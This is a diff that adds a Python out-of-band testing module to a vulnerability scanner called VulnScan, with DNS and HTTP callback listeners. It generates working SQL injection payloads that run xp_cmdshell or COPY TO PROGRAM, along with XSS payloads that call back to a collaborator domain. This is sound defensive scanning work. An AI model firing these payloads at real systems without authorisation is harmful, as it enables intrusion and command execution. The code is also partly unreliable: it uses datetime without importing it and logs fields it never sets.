@@ -1,3 +1,320 @@
+import time
+import uuid
+import threading
+import socket
+import socketserver
+import http.server
+from collections import defaultdict
+
+class VulnScanCollaborator:
+    """
+    OAST (Out-of-Band Application Security Testing) Collaborator for VulnScan
+    Detects blind vulnerabilities by monitoring DNS/HTTP callbacks from target servers
+    """
+    def __init__(self, domain="VulnScan-collaborator.local", dns_port=5353, http_port=8080, verbose=False):
+        self.domain = domain
+        self.dns_port = dns_port
+        self.http_port = http_port
+        self.verbose = verbose
+        self.active_payloads = {}
+        self.detected_callbacks = []
+        self.dns_server = None
+        self.http_server = None
+        self.servers_running = False
+        self.stats = {
+            'payloads_generated': 0,
+            'dns_callbacks': 0,
+            'http_callbacks': 0,
+            'vulnerabilities_detected': 0
+        }
+
+    def log(self, msg):
+        if self.verbose:
+            timestamp = datetime.now().strftime("%H:%M:%S")
+            print(f"[OAST {timestamp}] {msg}")
+
+    def start(self):
+        return self.start_collaborator_servers()
+
+    def stop(self):
+        return self.stop_collaborator_servers()
+
+    def get_stats(self):
+        return {
+            'total_callbacks': self.stats['dns_callbacks'] + self.stats['http_callbacks'],
+            'dns_callbacks': self.stats['dns_callbacks'],
+            'http_callbacks': self.stats['http_callbacks'],
+            'payloads_generated': self.stats['payloads_generated'],
+            'vulnerabilities_detected': self.stats['vulnerabilities_detected']
+        }
+
+    def start_collaborator_servers(self):
+        if self.servers_running:
+            return True
+        dns_port = self._find_available_port(self.dns_port)
+        http_port = self._find_available_port(self.http_port)
+        if dns_port != self.dns_port:
+            self.log(f"DNS port {self.dns_port} busy, using {dns_port}")
+            self.dns_port = dns_port
+        if http_port != self.http_port:
+            self.log(f"HTTP port {self.http_port} busy, using {http_port}")
+            self.http_port = http_port
+        try:
+            self.dns_server = CollaboratorDNSServer(
+                self.domain,
+                self.dns_port,
+                self.on_dns_callback,
+                self.verbose
+            )
+            dns_thread = threading.Thread(target=self.dns_server.start, daemon=True)
+            dns_thread.start()
+            self.http_server = CollaboratorHTTPServer(
+                self.http_port,
+                self.on_http_callback,
+                self.verbose
+            )
+            http_thread = threading.Thread(target=self.http_server.start, daemon=True)
+            http_thread.start()
+            time.sleep(1)
+            self.servers_running = True
+            self.log(f"Collaborator servers started - DNS:{self.dns_port}, HTTP:{self.http_port}")
+            return True
+        except Exception as e:
+            self.log(f"Failed to start collaborator servers: {e}")
+            return False
+
+    def _find_available_port(self, start_port):
+        for port in range(start_port, start_port + 100):
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.bind(('localhost', port))
+                    return port
+            except OSError:
+                continue
+        return start_port
+
+    def stop_collaborator_servers(self):
+        if self.dns_server:
+            self.dns_server.stop()
+        if self.http_server:
+            self.http_server.stop()
+        self.servers_running = False
+        self.log("Collaborator servers stopped")
+
+    def generate_sqli_payloads(self):
+        payloads = []
+        db_types = ['mssql', 'mysql', 'postgresql', 'oracle']
+        for db_type in db_types:
+            unique_id = str(uuid.uuid4())[:8]
+            subdomain = f"{unique_id}.sqli.{db_type}"
+            if db_type == 'mssql':
+                payload = f"'; EXEC xp_cmdshell('nslookup {subdomain}.{self.domain}'); --"
+            elif db_type == 'mysql':
+                payload = f"'; SELECT load_file(CONCAT('http://{subdomain}.{self.domain}/')); --"
+            elif db_type == 'postgresql':
+                payload = f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}.{self.domain}'; --"
+            elif db_type == 'oracle':
+                payload = f"' UNION SELECT utl_http.request('http://{subdomain}.{self.domain}/') FROM dual; --"
+            payload_info = {
+                'payload': payload,
+                'callback_id': unique_id,
+                'db_type': db_type,
+                'subdomain': f"{subdomain}.{self.domain}",
+                'timestamp': time.time(),
+                'detected': False
+            }
+            self.active_payloads[unique_id] = payload_info
+            payloads.append(payload_info)
+            self.stats['payloads_generated'] += 1
+        return payloads
+
+    def generate_xss_payloads(self):
+        payloads = []
+        contexts = ['script', 'img', 'iframe', 'form']
+        for context in contexts:
+            unique_id = str(uuid.uuid4())[:8]
+            subdomain = f"{unique_id}.xss.{context}"
+            if context == 'script':
+                payload = f"<script>fetch('http://{subdomain}.{self.domain}/')</script>"
+            elif context == 'img':
+                payload = f"<img src='http://{subdomain}.{self.domain}/' onerror='this.src=\"http://{subdomain}.{self.domain}/error\"'>"
+            elif context == 'iframe':
+                payload = f"<iframe src='http://{subdomain}.{self.domain}/'></iframe>"
+            elif context == 'form':
+                payload = f"<form action='http://{subdomain}.{self.domain}/' method='post'><input type='submit'></form>"
+            payload_info = {
+                'payload': payload,
+                'callback_id': unique_id,
+                'context': context,
+                'subdomain': f"{subdomain}.{self.domain}",
+                'timestamp': time.time(),
+                'detected': False
+            }
+            self.active_payloads[unique_id] = payload_info
+            payloads.append(payload_info)
+            self.stats['payloads_generated'] += 1
+        return payloads
+
+    def check_callback(self, callback_id):
+        if callback_id in self.active_payloads:
+            return self.active_payloads[callback_id]['detected']
+        return False
+
+    def on_dns_callback(self, query_name, client_ip):
+        self.stats['dns_callbacks'] += 1
+        self.log(f"DNS callback received: {query_name} from {client_ip}")
+        parts = query_name.split('.')
+        if len(parts) >= 3:
+            payload_id = parts[0]
+            vuln_type = parts[1] if len(parts) > 1 else 'unknown'
+            if payload_id in self.active_payloads:
+                self._mark_vulnerability_detected(payload_id, 'dns', {
+                    'query': query_name,
+                    'client_ip': client_ip,
+                    'callback_type': 'DNS'
+                })
+
+    def on_http_callback(self, path, client_ip, headers, method):
+        self.stats['http_callbacks'] += 1
+        self.log(f"HTTP callback received: {method} {path} from {client_ip}")
+        host = headers.get('Host', '')
+        if host:
+            parts = host.split('.')
+            if len(parts) >= 2:
+                payload_id = parts[0]
+                if payload_id in self.active_payloads:
+                    self._mark_vulnerability_detected(payload_id, 'http', {
+                        'path': path,
+                        'client_ip': client_ip,
+                        'method': method,
+                        'headers': dict(headers),
+                        'callback_type': 'HTTP'
+                    })
+
+    def _mark_vulnerability_detected(self, payload_id, callback_type, callback_data):
+        if payload_id in self.active_payloads:
+            payload_info = self.active_payloads[payload_id]
+            if not payload_info.get('detected', False):
+                payload_info['detected'] = True
+                payload_info['callback_data'] = callback_data
+                payload_info['detection_time'] = time.time()
+                self.detected_callbacks.append({
+                    'payload_id': payload_id,
+                    'payload_info': payload_info,
+                    'callback_type': callback_type,
+                    'callback_data': callback_data,
+                    'timestamp': time.time()
+                })
+                self.stats['vulnerabilities_detected'] += 1
+                vuln_type = payload_info.get('vulnerability_type', 'Unknown')
+                url = payload_info.get('url', 'Unknown')
+                param = payload_info.get('parameter', 'Unknown')
+                self.log(f"🚨 VULNERABILITY DETECTED! {vuln_type.upper()} via {callback_type}")
+                self.log(f"   Payload ID: {payload_id}")
+                self.log(f"   Details: {callback_data}")
+
+    def get_detected_vulnerabilities(self):
+        return self.detected_callbacks.copy()
+
+class CollaboratorDNSServer:
+    def __init__(self, domain, port, callback_handler, verbose=False):
+        self.domain = domain
+        self.port = port
+        self.callback_handler = callback_handler
+        self.verbose = verbose
+        self.running = False
+        self.socket = None
+    def start(self):
+        self.running = True
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            self.socket.bind(('0.0.0.0', self.port))
+            if self.verbose:
+                print(f"[OAST] DNS server listening on port {self.port}")
+            while self.running:
+                try:
+                    data, addr = self.socket.recvfrom(512)
+                    self._handle_dns_query(data, addr)
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    if self.running:
+                        if self.verbose:
+                            print(f"[OAST] DNS server error: {e}")
+        except Exception as e:
+            if self.verbose:
+                print(f"[OAST] Failed to start DNS server: {e}")
+        finally:
+            if self.socket:
+                self.socket.close()
+    def _handle_dns_query(self, data, addr):
+        try:
+            if len(data) > 12:
+                offset = 12
+                domain_parts = []
+                while offset < len(data):
+                    length = data[offset]
+                    if length == 0:
+                        break
+                    offset += 1
+                    if offset + length <= len(data):
+                        domain_parts.append(data[offset:offset + length].decode('utf-8', errors='ignore'))
+                        offset += length
+                    else:
+                        break
+                if domain_parts:
+                    query_domain = '.'.join(domain_parts)
+                    if self.domain in query_domain:
+                        self.callback_handler(query_domain, addr[0])
+        except Exception as e:
+            if self.verbose:
+                print(f"[OAST] DNS query parsing error: {e}")
+    def stop(self):
+        self.running = False
+        if self.socket:
+            self.socket.close()
+
+class CollaboratorHTTPServer:
+    def __init__(self, port, callback_handler, verbose=False):
+        self.port = port
+        self.callback_handler = callback_handler
+        self.verbose = verbose
+        self.server = None
+    def start(self):
+        handler = self._create_handler()
+        self.server = http.server.HTTPServer(('0.0.0.0', self.port), handler)
+        if self.verbose:
+            print(f"[OAST] HTTP server listening on port {self.port}")
+        try:
+            self.server.serve_forever()
+        except Exception as e:
+            if self.verbose:
+                print(f"[OAST] HTTP server error: {e}")
+    def _create_handler(self):
+        callback_handler = self.callback_handler
+        verbose = self.verbose
+        class CallbackHandler(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):
+                self._handle_request()
+            def do_POST(self):
+                self._handle_request()
+            def do_HEAD(self):
+                self._handle_request()
+            def _handle_request(self):
+                client_ip = self.client_address[0]
+                callback_handler(self.path, client_ip, self.headers, self.command)
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(b'VulnScan Collaborator')
+            def log_message(self, format, *args):
+                if verbose:
+                    super().log_message(format, *args)
+        return CallbackHandler
+    def stop(self):
+        if self.server:
+            self.server.shutdown()
+            self.server.server_close()
 """
 OAST (Out-of-Band Application Security Testing) Collaborator Service
 Handles callback generation, monitoring, and management for blind vulnerability detection
